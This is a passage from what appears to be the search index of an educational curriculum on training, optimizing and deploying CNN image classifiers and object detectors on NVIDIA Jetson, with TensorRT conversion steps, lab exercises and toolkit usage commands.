CUDA memory monitoring including allocated, cached, and free GPU memory with automatic cleanup routines.</p> <p>Garbage Collection: Intelligent Python garbage collection and CUDA cache clearing to free up memory during training and inference.</p> <p>Power Mode Control: Automated power mode switching (MAXN, 15W, 10W) based on workload requirements and thermal constraints.</p> <p>Clock Speed Optimization: Integration with jetson_clocks utility for maximum performance when needed.</p>"},{"location":"curriculum/my_05_cnn_image_processing_jetson/#toolkit-memory-management-usage","title":"Toolkit Memory Management Usage","text":"<pre><code># Monitor memory usage during training\npython jetson_cnn_toolkit.py --mode train --model BasicCNN --dataset cifar10 --monitor-memory\n\n# Optimize memory for inference\npython jetson_cnn_toolkit.py --mode inference --optimize-memory --power-mode 15W\n</code></pre>"},{"location":"curriculum/my_05_cnn_image_processing_jetson/#2-model-quantization-for-jetson","title":"2. Model Quantization for Jetson","text":"<p>Quantization reduces model precision from FP32 to INT8, significantly improving inference speed and reducing memory usage on Jetson devices.</p>"},{"location":"curriculum/my_05_cnn_image_processing_jetson/#quantization-techniques-in-jetson-toolkit","title":"Quantization Techniques in Jetson Toolkit","text":"<p>Post-Training Quantization (PTQ): Automatic conversion of trained FP32 models to INT8 without retraining, using calibration datasets for optimal accuracy preservation.</p> <p>Quantization-Aware Training (QAT): Training models with quantization simulation to achieve better accuracy in quantized form.</p> <p>Dynamic Quantization: Runtime quantization of weights while keeping activations in FP32 for balanced performance and accuracy.</p> <p>Static Quantization: Full INT8 quantization of both weights and activations using calibration data for maximum performance.</p>"},{"location":"curriculum/my_05_cnn_image_processing_jetson/#quantization-features","title":"Quantization Features","text":"<ul> <li>Automatic Calibration: Uses representative data samples to determine optimal quantization parameters</li> <li>Accuracy Preservation: Advanced techniques to minimize accuracy loss during quantization</li> <li>Jetson Optimization: Quantization schemes optimized for Jetson's Tensor Cores and DLA</li> <li>Flexible Precision: Support for mixed-precision quantization (FP16/INT8)</li> </ul>"},{"location":"curriculum/my_05_cnn_image_processing_jetson/#toolkit-quantization-usage","title":"Toolkit Quantization Usage","text":"<pre><code># Apply post-training quantization\npython jetson_cnn_toolkit.py --mode optimize --precision int8 --model-path trained_model.pth\n\n# Quantization-aware training\npython jetson_cnn_toolkit.py --mode train --model ResNet --quantize --precision int8\n</code></pre>"},{"location":"curriculum/my_05_cnn_image_processing_jetson/#3-tensorrt-optimization-pipeline","title":"3. TensorRT Optimization Pipeline","text":"<p>TensorRT is NVIDIA's high-performance deep learning inference optimizer and runtime library, essential for maximizing performance on Jetson devices.</p>"},{"location":"curriculum/my_05_cnn_image_processing_jetson/#tensorrt-optimization-features-in-jetson-toolkit","title":"TensorRT Optimization Features in Jetson Toolkit","text":"<p>Automatic ONNX Export: Seamless conversion of PyTorch models to ONNX format with optimized export parameters for TensorRT compatibility.</p> <p>Engine Building: Automated TensorRT engine construction with Jetson-specific optimizations including: - FP16 Precision: Leverages Jetson's Tensor Cores for 2x performance improvement - INT8 Calibration: Advanced quantization with accuracy preservation - Dynamic Shapes: Support for variable input sizes - Layer Fusion: Automatic optimization of network topology</p> <p>Memory Management: Efficient GPU memory allocation and buffer management for optimal inference performance.</p> <p>Inference Engine: High-performance inference runtime with: - Asynchronous Execution: Non-blocking inference for maximum throughput - Batch Processing: Optimized batch inference for multiple inputs - Memory Pooling: Reusable memory buffers to minimize allocation overhead</p>"},{"location":"curriculum/my_05_cnn_image_processing_jetson/#tensorrt-optimization-workflow","title":"TensorRT Optimization Workflow","text":"<ol> <li>Model Export: Convert trained PyTorch model to ONNX format</li> <li>Engine Building: Create optimized TensorRT engine with precision selection</li> <li>Calibration: Generate INT8 calibration data for quantized models</li> <li>Deployment: Load and run optimized engine for inference</li> </ol>"},{"location":"curriculum/my_05_cnn_image_processing_jetson/#toolkit-tensorrt-usage","title":"Toolkit TensorRT Usage","text":"<pre><code># Optimize model with TensorRT FP16\npython jetson_cnn_toolkit.py --mode optimize --precision fp16 --model-path model.pth --output-engine model_fp16.trt\n\n# Optimize with INT8 quantization\npython jetson_cnn_toolkit.py --mode optimize --precision int8 --calibration-data ./calibration --model-path model.pth\n\n# Benchmark TensorRT performance\npython jetson_cnn_toolkit.py --mode benchmark --engine-path model_fp16.trt --batch-size 1\n</code></pre>"},{"location":"curriculum/my_05_cnn_image_processing_jetson/#production-deployment-on-jetson","title":"\ud83d\ude80 Production Deployment on Jetson","text":""},{"location":"curriculum/my_05_cnn_image_processing_jetson/#real-time-image-classification-pipeline","title":"Real-time Image Classification Pipeline","text":"<p>The Jetson CNN Toolkit provides a complete production-ready deployment framework for real-time image classification applications.</p>"},{"location":"curriculum/my_05_cnn_image_processing_jetson/#real-time-inference-features","title":"Real-time Inference Features","text":"<p>Multi-threaded Architecture: Optimized pipeline with separate threads for camera capture, inference processing, and display rendering to maximize throughput.</p> <p>Camera Integration: Native support for USB and CSI cameras with configurable resolution, frame rate, and buffer management.</p> <p>Model Format Support: Seamless loading of PyTorch models (.pth), TensorRT engines (.trt), and ONNX models with automatic format detection.</p> <p>Performance Monitoring: Real-time tracking of FPS, inference latency, memory usage, and thermal metrics with visual overlays.</p> <p>Adaptive Processing: Dynamic frame dropping and quality adjustment based on system load and thermal constraints.</p>"},{"location":"curriculum/my_05_cnn_image_processing_jetson/#production-pipeline-components","title":"Production Pipeline Components","text":"<p>Image Preprocessing: Optimized preprocessing pipeline with GPU-accelerated transforms, normalization, and batching.</p> <p>Inference Engine: High-performance inference with support for: - Asynchronous Processing: Non-blocking inference for maximum throughput - Batch Optimization: Dynamic batching for improved GPU utilization - Memory Pooling: Efficient memory management to prevent allocation overhead</p> <p>Post-processing: Fast result processing with confidence thresholding, class mapping, and visualization.</p> <p>Display Integration: Real-time visualization with performance overlays, confidence indicators, and classification results.</p>"},{"location":"curriculum/my_05_cnn_image_processing_jetson/#deployment-usage-examples","title":"Deployment Usage Examples","text":"<pre><code># Real-time classification with camera\npython jetson_cnn_toolkit.py --mode inference --model-path model.trt --camera 0 --display\n\n# Batch processing of video files\npython jetson_cnn_toolkit.py --mode inference --model-path model.pth --input video.mp4 --output results.mp4\n\n# Performance benchmarking\npython jetson_cnn_toolkit.py --mode benchmark --model-path model.trt --batch-size 1 --iterations 1000\n\n# Production deployment with monitoring\npython jetson_cnn_toolkit.py --mode inference --model-path model.trt --monitor-performance --log-results\n</code></pre>"},{"location":"curriculum/my_05_cnn_image_processing_jetson/#comprehensive-lab-advanced-cnn-implementation-and-optimization","title":"\ud83e\uddea Comprehensive Lab: Advanced CNN Implementation and Optimization","text":""},{"location":"curriculum/my_05_cnn_image_processing_jetson/#lab-overview","title":"Lab Overview","text":"<p>This comprehensive lab demonstrates how to use the Jetson CNN Toolkit for implementing, training, and optimizing CNN models for real-time image classification on Jetson devices.</p>"},{"location":"curriculum/my_05_cnn_image_processing_jetson/#learning-objectives_1","title":"Learning Objectives","text":"<ul> <li>Master the Jetson CNN Toolkit for multiple CNN architectures</li> <li>Apply Jetson-specific optimizations using the toolkit</li> <li>Deploy real-time inference pipelines</li> <li>Compare performance across different optimization techniques</li> <li>Understand the complete ML pipeline from training to deployment</li> </ul>"},{"location":"curriculum/my_05_cnn_image_processing_jetson/#prerequisites","title":"Prerequisites","text":"<ul> <li>Jetson Orin Nano with JetPack 5.0+</li> <li>Python 3.8+ with pip</li> <li>Camera module (USB or CSI)</li> <li>16GB+ storage space</li> <li>Basic understanding of deep learning concepts</li> </ul>"},{"location":"curriculum/my_05_cnn_image_processing_jetson/#part-1-environment-setup-and-toolkit-installation","title":"Part 1: Environment Setup and Toolkit Installation","text":""},{"location":"curriculum/my_05_cnn_image_processing_jetson/#11-install-jetson-cnn-toolkit","title":"1.1 Install Jetson CNN Toolkit","text":"<pre><code># Clone the toolkit repository\ngit clone https://github.com/your-repo/jetson-cnn-toolkit.git\ncd jetson-cnn-toolkit\n\n# Install dependencies\npip3 install -r requirements.txt\n\n# Verify installation\npython3 jetson_cnn_toolkit.py --help\n</code></pre>"},{"location":"curriculum/my_05_cnn_image_processing_jetson/#12-dataset-preparation-with-toolkit","title":"1.2 Dataset Preparation with Toolkit","text":"<p>The toolkit provides automated dataset preparation and augmentation:</p> <pre><code># Download and prepare CIFAR-10 dataset\npython3 jetson_cnn_toolkit.py --mode prepare-data --dataset cifar10 --augment\n\n# Verify dataset preparation\npython3 jetson_cnn_toolkit.py --mode visualize-data --dataset cifar10 --samples 8\n</code></pre> <p>Dataset Features Provided by Toolkit: - Automatic Download: CIFAR-10, ImageNet subset, and custom dataset support - Smart Augmentation: Jetson-optimized data augmentation pipeline - Memory-Efficient Loading: Optimized data loaders for Jetson memory constraints - Validation Splitting: Automatic train/validation/test splits - Visualization Tools: Built-in dataset exploration and sample visualization</p>"},{"location":"curriculum/my_05_cnn_image_processing_jetson/#part-2-model-training-with-jetson-cnn-toolkit","title":"Part 2: Model Training with Jetson CNN Toolkit","text":""},{"location":"curriculum/my_05_cnn_image_processing_jetson/#21-training-framework","title":"2.1 Training Framework","text":"<p>The Jetson CNN Toolkit provides a comprehensive training framework optimized for Jetson devices:</p> <pre><code># Train a single model\npython3 jetson_cnn_toolkit.py --mode train \\\n    --model resnet18 \\\n    --dataset cifar10 \\\n    --epochs 50 \\\n    --batch-size 64 \\\n    --learning-rate 0.001 \\\n    --optimizer adam \\\n    --scheduler step \\\n    --device cuda\n\n# Monitor training progress\npython3 jetson_cnn_toolkit.py --mode monitor --experiment resnet18_cifar10\n</code></pre> <p>Training Features Provided by Toolkit: - Optimized Training Loop: Jetson-specific memory management and GPU utilization - Multiple Optimizers: Adam, SGD, AdamW with automatic hyperparameter tuning - Learning Rate Scheduling: Step, cosine, exponential, and plateau schedulers - Early Stopping: Automatic training termination based on validation metrics - Checkpointing: Automatic model saving and resuming from interruptions - Mixed Precision: FP16 training for faster convergence and memory efficiency - Real-time Monitoring: Live training metrics and resource utilization - Validation Tracking: Automatic best model selection based on validation performance</p>"},{"location":"curriculum/my_05_cnn_image_processing_jetson/#22-model-comparison-framework","title":"2.2 Model Comparison Framework","text":"<p>The toolkit provides automated model comparison capabilities:</p> <pre><code># Compare multiple architectures\npython3 jetson_cnn_toolkit.py --mode compare \\\n    --models resnet18,mobilenet_v2,efficientnet_b0 \\\n    --dataset cifar10 \\\n    --epochs 20 \\\n    --metrics accuracy,loss,inference_time,memory_usage\n\n# Generate comparison report\npython3 jetson_cnn_toolkit.py --mode report --experiment comparison_cifar10\n\n# Visualize comparison results\npython3 jetson_cnn_toolkit.py --mode visualize --experiment comparison_cifar10 --plots all\n</code></pre> <p>Model Comparison Features: - Automated Training: Parallel training of multiple architectures - Comprehensive Metrics: Accuracy, loss, training time, memory usage, inference speed - Statistical Analysis: Mean, standard deviation, confidence intervals - Visual Reports: Training curves, performance scatter plots, resource utilization - Model Ranking: Automatic ranking based on multiple criteria - Export Results: CSV, JSON, and PDF report generation - Hardware Profiling: Jetson-specific performance characteristics</p>"},{"location":"curriculum/my_05_cnn_image_processing_jetson/#part-3-model-training-and-comparison","title":"Part 3: Model Training and Comparison","text":""},{"location":"curriculum/my_05_cnn_image_processing_jetson/#31-train-multiple-architectures","title":"3.1 Train Multiple Architectures","text":"<p>Using the Jetson CNN Toolkit for comprehensive model comparison:</p> <pre><code># Train and compare multiple architectures\npython3 jetson_cnn_toolkit.py --mode batch-train \\\n    --models resnet18,mobilenet_v2,efficientnet_b0,custom_cnn \\\n    --dataset cifar10 \\\n    --epochs 15 \\\n    --batch-size 64 \\\n    --save-best \\\n    --generate-report\n\n# View training progress for all models\npython3 jetson_cnn_toolkit.py --mode dashboard --experiment batch_cifar10\n</code></pre> <p>Automated Training Pipeline: - Parallel Training: Efficient resource utilization across multiple models - Automatic Hyperparameter Tuning: Grid search and Bayesian optimization - Progress Tracking: Real-time monitoring of all training processes - Resource Management: Intelligent GPU memory allocation and cleanup - Result Aggregation: Automatic collection and comparison of results</p>"},{"location":"curriculum/my_05_cnn_image_processing_jetson/#part-4-jetson-optimization-and-deployment","title":"Part 4: Jetson Optimization and Deployment","text":""},{"location":"curriculum/my_05_cnn_image_processing_jetson/#41-performance-benchmarking","title":"4.1 Performance Benchmarking","text":"<p>The toolkit provides comprehensive benchmarking capabilities:</p> <pre><code># Benchmark all trained models\npython3 jetson_cnn_toolkit.py --mode benchmark \\\n    --experiment batch_cifar10 \\\n    --metrics inference_time,memory_usage,fps,throughput \\\n    --input-size 224,224 \\\n    --batch-sizes 1,4,8,16 \\\n    --iterations 100\n\n# Generate detailed profiling report\npython3 jetson_cnn_toolkit.py --mode profile \\\n    --model resnet18 \\\n    --detailed \\\n    --export-traces\n\n# Compare optimization techniques\npython3 jetson_cnn_toolkit.py --mode optimize-compare \\\n    --model resnet18 \\\n    --techniques fp16,tensorrt,quantization \\\n    --benchmark\n</code></pre> <p>Benchmarking Features: - Comprehensive Metrics: Inference time, memory usage, FPS, throughput, power consumption - Statistical Analysis: Mean, median, standard deviation, percentiles - Batch Size Analysis: Performance scaling across different batch sizes - Hardware Profiling: GPU utilization, memory bandwidth, thermal monitoring - Optimization Comparison: Before/after optimization performance analysis - Export Capabilities: JSON, CSV, and visual reports - Real-time Monitoring: Live performance dashboard during benchmarking</p>"},{"location":"curriculum/my_05_cnn_image_processing_jetson/#part-5-real-time-deployment","title":"Part 5: Real-time Deployment","text":""},{"location":"curriculum/my_05_cnn_image_processing_jetson/#51-deploy-best-model-for-real-time-inference","title":"5.1 Deploy Best Model for Real-time Inference","text":"<p>The toolkit provides seamless real-time deployment capabilities:</p> <pre><code># Deploy the best performing model for real-time inference\npython3 jetson_cnn_toolkit.py --mode deploy \\\n    --experiment batch_cifar10 \\\n    --select-best accuracy \\\n    --camera 0 \\\n    --display \\\n    --save-stats\n\n# Deploy with specific optimizations\npython3 jetson_cnn_toolkit.py --mode deploy \\\n    --model resnet18 \\\n    --optimize tensorrt \\\n    --camera 0 \\\n    --fps-target 30 \\\n    --resolution 640x480\n\n# Batch inference on image directory\npython3 jetson_cnn_toolkit.py --mode infer \\\n    --model resnet18 \\\n    --input-dir ./test_images \\\n    --output-dir ./results \\\n    --batch-size 8\n</code></pre> <p>Real-time Deployment Features: - Automatic Model Selection: Choose best model based on accuracy, speed, or custom criteria - Camera Integration: Support for USB, CSI, and IP cameras - Real-time Optimization: Dynamic batch sizing and frame skipping - Performance Monitoring: Live FPS, latency, and resource utilization - Output Options: Display, save images, export predictions - Multi-format Support: Images, videos, and live camera streams - Error Handling: Robust error recovery and logging</p>"},{"location":"curriculum/my_05_cnn_image_processing_jetson/#lab-deliverables","title":"Lab Deliverables","text":""},{"location":"curriculum/my_05_cnn_image_processing_jetson/#required-deliverables","title":"Required Deliverables","text":"<ol> <li>Model Implementation Report</li> <li>Implementation of at least 3 different CNN architectures</li> <li>Training curves and accuracy comparisons</li> <li> <p>Analysis of parameter count vs performance trade-offs</p> </li> <li> <p>Optimization Analysis</p> </li> <li>Benchmark results for all models</li> <li>Memory usage analysis</li> <li>Performance profiling reports</li> <li> <p>Jetson-specific optimization recommendations</p> </li> <li> <p>Real-time Deployment Demo</p> </li> <li>Working real-time inference pipeline</li> <li>Performance metrics (FPS, latency, accuracy)</li> <li> <p>Video demonstration or screenshots</p> </li> <li> <p>Technical Documentation</p> </li> <li>Code documentation and comments</li> <li>Setup instructions for reproduction</li> <li>Troubleshooting guide</li> </ol>"},{"location":"curriculum/my_05_cnn_image_processing_jetson/#bonus-challenges","title":"Bonus Challenges","text":"<ol> <li>\ud83c\udfc6 TensorRT Master <pre><code># Convert best model to TensorRT engine using toolkit\npython3 jetson_cnn_toolkit.py --mode optimize --model resnet18 --technique tensorrt --target-speedup 50\n</code></pre></li> <li>Achieve &gt;50% inference speedup</li> <li> <p>Maintain &lt;2% accuracy loss</p> </li> <li> <p>\ud83e\udde0 Architecture Innovator <pre><code># Create custom architecture with toolkit\npython3 jetson_cnn_toolkit.py --mode create-custom --architecture-config custom_cnn.json --optimize-params\n</code></pre></p> </li> <li>Design and implement custom CNN architecture</li> <li>Achieve competitive accuracy with fewer parameters</li> <li> <p>Document design decisions</p> </li> <li> <p>\u26a1 Speed Demon <pre><code># Optimize for maximum FPS\npython3 jetson_cnn_toolkit.py --mode optimize-speed --model resnet18 --target-fps 30 --enable-threading\n</code></pre></p> </li> <li>Achieve &gt;30 FPS real-time inference</li> <li>Implement multi-threading optimization</li> <li> <p>Add performance monitoring dashboard</p> </li> <li> <p>\ud83c\udfaf Accuracy Champion <pre><code># Advanced training with ensemble methods\npython3 jetson_cnn_toolkit.py --mode advanced-train --ensemble --knowledge-distillation --target-accuracy 90\n</code></pre></p> </li> <li>Achieve &gt;90% validation accuracy on CIFAR-10</li> <li>Implement advanced training techniques</li> <li> <p>Use ensemble methods or knowledge distillation</p> </li> <li> <p>\ud83d\udd27 Production Ready <pre><code># Create production deployment package\npython3 jetson_cnn_toolkit.py --mode package --model resnet18 --include-monitoring --version-control\n</code></pre></p> </li> <li>Create complete deployment package</li> <li>Add error handling and logging</li> <li>Implement model versioning and updates</li> </ol>"},{"location":"curriculum/my_05_cnn_image_processing_jetson/#summary-and-next-steps","title":"Summary and Next Steps","text":""},{"location":"curriculum/my_05_cnn_image_processing_jetson/#what-youve-accomplished","title":"What You've Accomplished","text":"<ul> <li>\u2705 Mastered the Jetson CNN Toolkit for multiple CNN architectures</li> <li>\u2705 Applied comprehensive training and validation frameworks using the toolkit</li> <li>\u2705 Performed Jetson-specific optimizations through automated tools</li> <li>\u2705 Deployed real-time inference pipelines with toolkit integration</li> <li>\u2705 Conducted performance benchmarking and analysis using built-in tools</li> </ul>"},{"location":"curriculum/my_05_cnn_image_processing_jetson/#key-takeaways","title":"Key Takeaways","text":"<ol> <li>Architecture Matters: Different CNN architectures have distinct trade-offs between accuracy, speed, and memory usage</li> <li>Optimization is Critical: Jetson-specific optimizations can significantly improve performance</li> <li>Real-time Constraints: Production deployment requires careful balance of accuracy and speed</li> <li>Profiling is Essential: Understanding bottlenecks is key to effective optimization</li> </ol>"},{"location":"curriculum/my_05_cnn_image_processing_jetson/#next-steps","title":"Next Steps","text":"<ol> <li>Explore advanced optimization techniques (TensorRT, quantization)</li> <li>Implement object detection and segmentation models</li> <li>Study transformer-based vision models</li> <li>Investigate edge AI deployment strategies</li> <li>Learn about model compression and pruning techniques</li> </ol> <p>\ud83d\udccc Summary - \u2705 CNNs are essential for computer vision tasks - \u2705 Jetson devices provide excellent edge AI capabilities - \u2705 Multiple optimization strategies can improve performance - \u2705 Real-time deployment requires careful engineering - \u2705 Benchmarking and profiling guide optimization decisions</p> <p>\u2192 Next: Transformers &amp; LLMs on Jetson ```</p> <p>\u2e3b</p> <p>\u26a1\ufe0f TensorRT Acceleration on Jetson</p> <p>\ud83e\udde9 What is TensorRT?</p> <p>TensorRT is NVIDIA\u2019s high-performance deep learning inference optimizer and runtime engine. It converts trained models (ONNX, PyTorch, TensorFlow) into fast, deployable engines.</p> <p>\ud83d\udd01 Workflow: PyTorch \u2192 ONNX \u2192 TensorRT     1.  Export model to ONNX</p> <p>import torch import torchvision.models as models</p> <p>model = models.resnet18(pretrained=True) model.eval()</p> <p>dummy_input = torch.randn(1, 3, 224, 224) torch.onnx.export(model, dummy_input, \"resnet18.onnx\", opset_version=11)</p> <pre><code>2.  Convert ONNX to TensorRT engine\n</code></pre> <p>/opt/nvidia/onnxruntime/bin/trtexec --onnx=resnet18.onnx --saveEngine=resnet18.trt --explicitBatch</p> <pre><code>3.  Run inference with TensorRT Python API\n</code></pre> <p>Use libraries like tensorrt, pycuda, or NVIDIA\u2019s onnxruntime-gpu backend.</p> <p>\u2e3b</p> <p>\ud83e\uddea Jetson Image Processing Tools</p> <p>Tool/Library    Purpose OpenCV (cv2)    Real-time image processing Pillow (PIL)    Image loading and conversion PyTorch/TensorRT    CNN inference v4l2-ctl    Access and configure camera GStreamer   Media pipeline and camera stream</p> <p>\u2e3b</p> <p>\ud83e\uddea Lab: Classify Images with ResNet on Jetson</p> <p>\ud83c\udfaf Objective</p> <p>Run a pretrained CNN to classify local image data using PyTorch on Jetson. Then accelerate with TensorRT.</p> <p>\u2705 Setup</p> <p>pip install torch torchvision pillow opencv-python onnx sudo apt install python3-pycuda</p> <p>\ud83d\udee0\ufe0f Tasks     1.  Run PyTorch-based ResNet inference on a test image     2.  Export to ONNX and convert to TensorRT engine     3.  Run and compare performance (fps / latency)</p> <p>\ud83d\udccb Deliverables     \u2022   Output of predicted class     \u2022   Timing comparison between PyTorch and TensorRT     \u2022   Screenshot of TensorRT engine build or trtexec results</p> <p>\u2e3b</p> <p>\ud83e\uddea Lab: TensorRT-Based Image Classification in PyTorch Container</p> <p>\ud83c\udfaf Objective</p> <p>Use a Docker container with PyTorch and TensorRT pre-installed to classify an image using an optimized engine.</p> <p>\u2705 Container Setup</p> <p>Use NVIDIA\u2019s PyTorch container image with TensorRT:</p> <p>docker run --rm -it --runtime nvidia \\   -v $(pwd):/workspace \\   nvcr.io/nvidia/pytorch:24.04-py3 /bin/bash</p> <p>Inside container:</p> <p>pip install pillow onnx</p> <p>\ud83d\udee0\ufe0f Tasks     1.  Inside the container, download and convert a ResNet model to ONNX.     2.  Run trtexec to convert ONNX \u2192 TensorRT.     3.  Write a Python script to load and run inference on the image using the onnxruntime-gpu or tensorrt backend.</p> <p>Sample trtexec command</p> <p>trtexec --onnx=resnet18.onnx --saveEngine=resnet18.trt --explicitBatch</p> <p>Sample Python snippet</p> <p>import onnxruntime as ort from PIL import Image import numpy as np</p>"},{"location":"curriculum/my_05_cnn_image_processing_jetson/#preprocess-input","title":"Preprocess input","text":"<p>img = Image.open(\"cat.jpg\").resize((224, 224)) img_np = np.asarray(img).astype(np.float32) / 255.0 img_np = img_np.transpose(2, 0, 1).reshape(1, 3, 224, 224)</p>"},{"location":"curriculum/my_05_cnn_image_processing_jetson/#run-inference","title":"Run inference","text":"<p>session = ort.InferenceSession(\"resnet18.onnx\") outputs = session.run(None, {session.get_inputs()[0].name: img_np}) print(\"Predicted index:\", np.argmax(outputs[0]))</p> <p>\ud83d\udccb Deliverables     \u2022   Screenshot of classification output     \u2022   Screenshot of trtexec performance results     \u2022   Brief reflection: how does TensorRT help?</p> <p>\u2e3b</p> <p>\ud83d\udccc Summary     \u2022   CNNs are essential for vision-based AI     \u2022   Jetson accelerates inference with CUDA + TensorRT     \u2022   TensorRT reduces latency and improves FPS     \u2022   PyTorch models can be deployed as optimized engines</p> <p>\u2192 Next: Transformers &amp; LLMs</p>"},{"location":"curriculum/my_05b_yolo_vlm_object_detection/","title":"\ud83c\udfaf Deep Learning Object Detection on Jetson: From Classical to Zero-Shot Approaches","text":"<p>This comprehensive guide covers modern object detection techniques on NVIDIA Jetson, from classical two-stage detectors to cutting-edge zero-shot models:</p> <ul> <li>Two-Stage Detectors: Faster R-CNN, Mask R-CNN</li> <li>One-Stage Detectors: YOLO family, SSD, RetinaNet</li> <li>Zero-Shot Detection: GroundingDINO, OWL-ViT</li> <li>TensorRT Optimization: Performance acceleration on Jetson</li> <li>Comparative Analysis: Speed vs. accuracy trade-offs</li> </ul>"},{"location":"curriculum/my_05b_yolo_vlm_object_detection/#object-detection-fundamentals","title":"\ud83e\udde0 Object Detection Fundamentals","text":"<p>Object detection is a computer vision task that combines:</p> <p>Object Detection = Classification + Localization + Multiple Objects</p>"},{"location":"curriculum/my_05b_yolo_vlm_object_detection/#detection-pipeline-components","title":"\ud83d\udcca Detection Pipeline Components","text":"Component Purpose Output Backbone Feature extraction Feature maps Neck Feature fusion/enhancement Multi-scale features Head Classification + Regression Bounding boxes + Classes Post-processing NMS, confidence filtering Final detections"},{"location":"curriculum/my_05b_yolo_vlm_object_detection/#evaluation-metrics","title":"\ud83c\udfaf Evaluation Metrics","text":"<ul> <li>mAP (mean Average Precision): Primary metric for detection accuracy</li> <li>IoU (Intersection over Union): Overlap between predicted and ground truth boxes</li> <li>FPS (Frames Per Second): Inference speed metric</li> <li>Model Size: Memory footprint and storage requirements</li> </ul>"},{"location":"curriculum/my_05b_yolo_vlm_object_detection/#two-stage-object-detectors","title":"\ud83c\udfd7\ufe0f Two-Stage Object Detectors","text":"<p>Two-stage detectors separate object detection into two phases: region proposal generation and classification/refinement.</p>"},{"location":"curriculum/my_05b_yolo_vlm_object_detection/#faster-r-cnn-architecture","title":"\ud83c\udfaf Faster R-CNN Architecture","text":"<pre><code>Input Image \u2192 Backbone (ResNet/VGG) \u2192 RPN \u2192 ROI Pooling \u2192 Classification Head\n                                    \u2193\n                              Region Proposals\n</code></pre>"},{"location":"curriculum/my_05b_yolo_vlm_object_detection/#key-components","title":"\ud83d\udd27 Key Components","text":"<ol> <li>Region Proposal Network (RPN): Generates object proposals</li> <li>ROI Pooling: Extracts fixed-size features from proposals</li> <li>Classification Head: Final object classification and bbox regression</li> </ol>"},{"location":"curriculum/my_05b_yolo_vlm_object_detection/#faster-r-cnn-implementation-on-jetson","title":"\ud83d\udee0\ufe0f Faster R-CNN Implementation on Jetson","text":"<p>The Jetson Object Detection Toolkit provides a comprehensive implementation of Faster R-CNN with optimized performance for Jetson devices.</p> <p>Key Features: - Pre-trained on COCO dataset (80 classes) - Automatic GPU acceleration - Real-time performance monitoring - Easy-to-use command-line interface - Support for camera, image, and video inputs</p> <p>Usage Examples:</p> <pre><code># Real-time camera detection with high accuracy\npython3 jetson_object_detection_toolkit.py --model faster-rcnn --source camera --confidence 0.7\n\n# Process single image\npython3 jetson_object_detection_toolkit.py --model faster-rcnn --source image.jpg --output result.jpg\n\n# Video processing\npython3 jetson_object_detection_toolkit.py --model faster-rcnn --source video.mp4 --output output.mp4\n</code></pre> <p>Performance Characteristics: - Accuracy: Highest among all supported models - Speed: 8-12 FPS on Jetson Orin, 4-6 FPS on Xavier NX - Memory: Moderate GPU memory usage - Use Cases: Security surveillance, quality control, detailed analysis</p>"},{"location":"curriculum/my_05b_yolo_vlm_object_detection/#mask-r-cnn-for-instance-segmentation","title":"\ud83c\udfad Mask R-CNN for Instance Segmentation","text":"<pre><code>from torchvision.models.detection import maskrcnn_resnet50_fpn\nimport matplotlib.pyplot as plt\n\nclass MaskRCNNDetector:\n    def __init__(self, device='cuda'):\n        self.device = device\n        self.model = maskrcnn_resnet50_fpn(pretrained=True)\n        self.model.to(device)\n        self.model.eval()\n\n    def detect_with_masks(self, image, confidence_threshold=0.5):\n        \"\"\"Detect objects and generate segmentation masks\"\"\"\n        image_tensor = transforms.ToTensor()(image).unsqueeze(0).to(self.device)\n\n        with torch.no_grad():\n            predictions = self.model(image_tensor)\n\n        boxes = predictions[0]['boxes'].cpu().numpy()\n        scores = predictions[0]['scores'].cpu().numpy()\n        labels = predictions[0]['labels'].cpu().numpy()\n        masks = predictions[0]['masks'].cpu().numpy()\n\n        # Filter by confidence\n        mask = scores &gt; confidence_threshold\n        return boxes[mask], scores[mask], labels[mask], masks[mask]\n</code></pre>"},{"location":"curriculum/my_05b_yolo_vlm_object_detection/#one-stage-object-detectors","title":"\u26a1 One-Stage Object Detectors","text":"<p>One-stage detectors perform detection in a single forward pass, trading some accuracy for speed.</p>"},{"location":"curriculum/my_05b_yolo_vlm_object_detection/#yolo-family-evolution","title":"\ud83c\udfaf YOLO Family Evolution","text":"Model Year Key Innovation Speed (FPS) mAP YOLOv1 2016 Grid-based detection 45 63.4 YOLOv3 2018 Multi-scale prediction 20 55.3 YOLOv5 2020 Efficient architecture 140 56.8 YOLOv8 2023 Anchor-free design 80 53.9 YOLOv10 2024 NMS-free training 120 54.4"},{"location":"curriculum/my_05b_yolo_vlm_object_detection/#yolo-with-tensorrt-acceleration","title":"\ud83d\ude80 YOLO with TensorRT Acceleration","text":""},{"location":"curriculum/my_05b_yolo_vlm_object_detection/#why-tensorrt","title":"\ud83d\udd27 Why TensorRT?","text":"<p>TensorRT provides significant performance improvements on Jetson: - 2-5x speedup compared to standard PyTorch inference - Reduced memory usage through layer fusion and optimization - Mixed precision support (FP16/INT8) for faster inference - Dynamic shape optimization for variable input sizes</p>"},{"location":"curriculum/my_05b_yolo_vlm_object_detection/#complete-yolov8-setup-on-jetson","title":"\ud83d\udee0\ufe0f Complete YOLOv8 Setup on Jetson","text":"<pre><code># Install dependencies\npip install ultralytics torch torchvision\nsudo apt update\nsudo apt install python3-libnvinfer-dev libnvinfer-bin\n\n# Verify TensorRT installation\npython3 -c \"import tensorrt; print(f'TensorRT version: {tensorrt.__version__}')\"\n</code></pre>"},{"location":"curriculum/my_05b_yolo_vlm_object_detection/#enhanced-yolov8-implementation","title":"\ud83c\udfaf Enhanced YOLOv8 Implementation","text":"<p>The Jetson Object Detection Toolkit provides optimized YOLOv8 implementation with optional TensorRT acceleration for maximum performance on Jetson devices.</p> <p>Key Features: - Multiple YOLOv8 variants (nano, small, medium, large, extra-large) - Automatic TensorRT optimization for Jetson Orin - Real-time performance with FP16 precision - Seamless fallback to PyTorch if TensorRT unavailable - Comprehensive performance benchmarking - Real-time FPS and inference time monitoring</p> <p>Usage Examples:</p> <pre><code># High-speed detection with TensorRT acceleration\npython3 jetson_object_detection_toolkit.py --model yolov8n --source camera --tensorrt --precision fp16\n\n# Compare PyTorch vs TensorRT performance\npython3 jetson_object_detection_toolkit.py --model yolov8s --benchmark --tensorrt\n\n# Process video with maximum accuracy\npython3 jetson_object_detection_toolkit.py --model yolov8x --source video.mp4 --confidence 0.6 --tensorrt\n\n# Real-time detection with performance monitoring\npython3 jetson_object_detection_toolkit.py --model yolov8n --source camera --show-fps --confidence 0.25\n</code></pre> <p>Performance Characteristics: - Speed: 30-60 FPS on Jetson Orin (with TensorRT), 15-25 FPS on Xavier NX - TensorRT Speedup: 2-4x faster than PyTorch - Memory: Low GPU memory usage - Accuracy: Excellent balance of speed and precision - Use Cases: Real-time applications, autonomous systems, 